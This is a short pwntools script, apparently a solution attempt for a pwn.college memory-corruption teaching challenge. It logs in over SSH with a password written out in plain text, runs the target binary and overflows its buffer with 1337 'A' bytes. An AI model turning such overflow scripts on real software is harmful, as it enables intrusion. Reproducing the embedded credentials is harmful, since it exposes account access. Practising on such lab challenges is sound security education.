from pwn import *

filename = './babymem_level2_teaching1'
context.log_level = 'debug'

s = ssh(host="ssu-csec.pwn.college", user="ssu-csec", port=22, password="djaxod12", keyfile="../../csec")
argv = [filename]
p = s.process(argv)
# p = process(argv)

p.sendlineafter(b'Payload size: ', b'1337')

# pause()
p.sendafter(b'bytes)!\n', b'A'*1337)

p.interactive()